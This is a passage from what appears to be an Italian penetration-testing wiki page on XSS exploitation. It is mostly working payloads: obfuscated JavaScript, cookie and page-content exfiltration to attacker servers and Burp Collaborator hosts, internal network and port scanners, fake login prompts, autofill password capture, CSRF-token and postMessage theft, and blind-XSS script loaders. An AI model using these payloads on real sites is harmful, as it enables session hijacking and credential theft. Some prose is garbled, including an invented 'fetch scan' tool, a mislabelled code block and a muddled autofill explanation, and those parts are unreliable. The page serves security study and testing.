<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS payload comuni

### Diversi payload in 1

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### Recuperare i Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
Non sarai in grado di accedere ai cookie da JavaScript se il flag HTTPOnly è impostato nel cookie. Ma qui hai [alcuni modi per aggirare questa protezione](../hacking-with-cookies/#httponly) se hai abbastanza fortuna.
{% endhint %}

### Rubare il contenuto della pagina
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### Trovare gli IP interni

Per identificare gli indirizzi IP interni di un sistema, puoi utilizzare diverse tecniche:

1. **Ping Sweep**: Puoi eseguire uno sweep di ping su un intervallo di indirizzi IP per verificare quali indirizzi rispondono. Ad esempio, puoi utilizzare il comando `ping -c 1 192.168.0.0/24` per eseguire uno sweep di ping su tutti gli indirizzi IP nella sottorete 192.168.0.0/24.

2. **ARP Scanning**: Puoi utilizzare il comando `arp-scan` per eseguire una scansione ARP sulla tua rete locale e ottenere gli indirizzi IP interni. Ad esempio, puoi eseguire il comando `arp-scan --localnet` per eseguire una scansione ARP su tutti gli indirizzi IP nella tua rete locale.

3. **DNS Reverse Lookup**: Puoi utilizzare il servizio DNS per eseguire una ricerca inversa degli indirizzi IP interni. Ad esempio, puoi utilizzare il comando `nslookup 192.168.0.1` per ottenere il nome host associato all'indirizzo IP 192.168.0.1.

4. **Port Scanning**: Puoi utilizzare uno strumento di scansione delle porte come Nmap per identificare gli indirizzi IP interni che rispondono alle richieste di connessione su determinate porte. Ad esempio, puoi utilizzare il comando `nmap -p 80 192.168.0.0/24` per eseguire una scansione delle porte sulla sottorete 192.168.0.0/24 e identificare gli indirizzi IP interni che rispondono sulla porta 80.

Ricorda che l'identificazione degli indirizzi IP interni deve essere effettuata in modo etico e nel rispetto delle leggi sulla privacy e della sicurezza delle informazioni.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### Port Scanner (fetch)

Il Port Scanner (fetch) è uno strumento utilizzato per identificare le porte aperte su un sistema remoto. Funziona inviando richieste di connessione a diverse porte e analizzando le risposte ricevute. Questo strumento è particolarmente utile durante il processo di penetration testing per identificare potenziali punti di ingresso vulnerabili.

#### Utilizzo

Per utilizzare il Port Scanner (fetch), segui i seguenti passaggi:

1. Apri il terminale e avvia il Port Scanner (fetch).
2. Specifica l'indirizzo IP o il nome del dominio del sistema remoto che desideri analizzare.
3. Imposta l'intervallo di porte da scansionare.
4. Avvia la scansione delle porte.
5. Analizza i risultati ottenuti per identificare le porte aperte.

#### Esempio

```
fetch scan -t <target> -p <port_range>
```

Dove:
- `<target>` rappresenta l'indirizzo IP o il nome del dominio del sistema remoto da analizzare.
- `<port_range>` rappresenta l'intervallo di porte da scansionare. Ad esempio, puoi specificare "1-1000" per scansionare le prime 1000 porte.

#### Risultati

I risultati della scansione delle porte mostreranno le porte aperte sul sistema remoto. Queste informazioni possono essere utilizzate per identificare potenziali vulnerabilità e punti di ingresso per un attacco.

#### Considerazioni sulla sicurezza

È importante notare che la scansione delle porte su un sistema remoto senza autorizzazione può essere considerata un'attività illegale. Assicurati di ottenere il consenso del proprietario del sistema prima di eseguire una scansione delle porte.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Scanner di porte (websockets)

Il Port Scanner è uno strumento utilizzato per identificare le porte aperte su un sistema remoto. Questo strumento può essere utilizzato per individuare potenziali vulnerabilità di sicurezza e per valutare la configurazione di rete di un sistema.

Il Port Scanner basato su websockets è una variante del Port Scanner tradizionale che utilizza la tecnologia dei websockets per effettuare la scansione delle porte. I websockets consentono una comunicazione bidirezionale tra un client e un server, rendendo possibile l'invio di richieste di scansione delle porte e la ricezione delle risposte.

Per utilizzare il Port Scanner basato su websockets, è necessario avere accesso a un server che supporti i websockets e che abbia installato il software del Port Scanner. Una volta connesso al server tramite un client websockets, è possibile avviare la scansione delle porte specificando l'indirizzo IP del sistema remoto e l'intervallo di porte da esaminare.

Durante la scansione, il Port Scanner invierà richieste di connessione a ciascuna porta nell'intervallo specificato e aspetterà una risposta dal sistema remoto. Se una porta è aperta, il Port Scanner riceverà una risposta positiva e registrerà la porta come aperta. Se una porta è chiusa o filtrata, il Port Scanner riceverà una risposta negativa e registrerà la porta come chiusa o filtrata.

Una volta completata la scansione, il Port Scanner fornirà un rapporto dettagliato delle porte aperte e chiuse sul sistema remoto. Queste informazioni possono essere utilizzate per valutare la sicurezza del sistema e per prendere eventuali misure correttive necessarie.

È importante notare che l'utilizzo del Port Scanner per effettuare la scansione delle porte di un sistema senza autorizzazione può essere considerato un'attività illegale e può violare le leggi sulla privacy e sulla sicurezza. Pertanto, è fondamentale ottenere il consenso del proprietario del sistema prima di utilizzare questo strumento.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_I tempi brevi indicano una porta che risponde_ _I tempi più lunghi indicano l'assenza di risposta._

Consulta l'elenco delle porte bloccate in Chrome [**qui**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) e in Firefox [**qui**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Casella per richiedere le credenziali
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Cattura delle password di auto-compilazione

Auto-fill passwords are a convenient feature offered by many web browsers. When enabled, the browser automatically fills in saved usernames and passwords for specific websites. However, this feature can also be exploited by attackers to capture sensitive information.

#### How it works

When a user visits a website with auto-fill enabled, the browser automatically populates the login form with the saved credentials. This is done by injecting JavaScript code into the page, which retrieves the stored passwords and fills them into the appropriate fields.

#### Exploiting auto-fill passwords

Attackers can take advantage of this feature by injecting malicious code into a vulnerable website. This code can be used to capture the auto-filled passwords and send them to a remote server controlled by the attacker.

To exploit auto-fill passwords, an attacker typically needs to find a vulnerability in the target website that allows them to inject their own code. This can be achieved through various techniques, such as cross-site scripting (XSS) or remote code execution (RCE).

#### Mitigating the risk

To protect against auto-fill password capture attacks, both users and website owners can take certain precautions:

- Users should be cautious when enabling auto-fill passwords and only use this feature on trusted websites.
- Regularly clearing browser cache and stored passwords can help minimize the risk of password capture.
- Website owners should implement proper security measures, such as input validation and output encoding, to prevent code injection vulnerabilities.

By understanding the risks associated with auto-fill passwords and taking appropriate precautions, users and website owners can help mitigate the potential impact of this attack vector.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Quando vengono inseriti dati nel campo password, il nome utente e la password vengono inviati al server degli attaccanti, anche se il client seleziona una password salvata e non scrive nulla, le credenziali verranno esfiltrate.

### Keylogger

Cercando su github ne ho trovati alcuni diversi:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* Puoi anche utilizzare metasploit `http_javascript_keylogger`

### Rubare i token CSRF
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Rubare i messaggi di PostMessage

In alcuni casi, è possibile sfruttare una vulnerabilità di Cross-Site Scripting (XSS) per rubare i messaggi inviati tramite PostMessage. Questo metodo di comunicazione tra finestre o frame di un'applicazione web può essere utilizzato per scambiare informazioni sensibili tra le diverse parti dell'applicazione.

Per sfruttare questa vulnerabilità, un attaccante può iniettare un payload XSS all'interno di un'applicazione web. Quando il payload viene eseguito nel contesto dell'applicazione, può intercettare i messaggi inviati tramite PostMessage e inviarli a un server controllato dall'attaccante.

Per prevenire questo tipo di attacco, è importante implementare correttamente le misure di sicurezza per mitigare le vulnerabilità di XSS. Ciò include l'uso di sanitizzazione dei dati di input, l'implementazione di meccanismi di protezione come Content Security Policy (CSP) e l'adozione di best practice di sviluppo sicuro.

È fondamentale che gli sviluppatori e i responsabili della sicurezza comprendano i rischi associati a questa vulnerabilità e adottino le misure necessarie per proteggere le applicazioni web da attacchi di questo tipo.
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Abuso dei Service Workers

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### Accesso a Shadow DOM

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### Poliglotti

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Payloads Blind XSS

Puoi anche utilizzare: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### Regex - Accesso a contenuti nascosti

Da [**questo articolo**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) è possibile apprendere che anche se alcuni valori scompaiono dal JS, è comunque possibile trovarli negli attributi JS in diversi oggetti. Ad esempio, è ancora possibile trovare un input di una REGEX anche dopo che il valore dell'input della regex è stato rimosso:
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### Elenco di Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## XSS Sfruttando altre vulnerabilità

### XSS in Markdown

È possibile iniettare codice Markdown che verrà renderizzato? Forse puoi ottenere XSS! Controlla:

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS a SSRF

Hai ottenuto XSS su un **sito che utilizza la memorizzazione nella cache**? Prova a **aggiornarlo a SSRF** tramite l'Injection di Edge Side Include con questo payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Usalo per aggirare le restrizioni dei cookie, i filtri XSS e molto altro ancora!\
Ulteriori informazioni su questa tecnica qui: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in PDF creati dinamicamente

Se una pagina web crea un PDF utilizzando input controllati dall'utente, puoi provare a **ingannare il bot** che sta creando il PDF per **eseguire codice JS arbitrario**.\
Quindi, se il **bot creatore di PDF trova** qualche tipo di **tag HTML**, li interpreterà e puoi **abusare** di questo comportamento per causare un **Server XSS**.

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

Se non puoi iniettare tag HTML, potrebbe valere la pena di provare a **iniettare dati PDF**:

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### XSS in Amp4Email

AMP, mirato ad accelerare le prestazioni delle pagine web sui dispositivi mobili, incorpora tag HTML integrati da JavaScript per garantire funzionalità con un'enfasi sulla velocità e la sicurezza. Supporta una serie di componenti per varie funzionalità, accessibili tramite [componenti AMP](https://amp.dev/documentation/components/?format=websites).

Il formato [**AMP per Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) estende specifici componenti AMP alle email, consentendo ai destinatari di interagire direttamente con i contenuti all'interno delle loro email.

Esempio di [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS caricando file (svg)

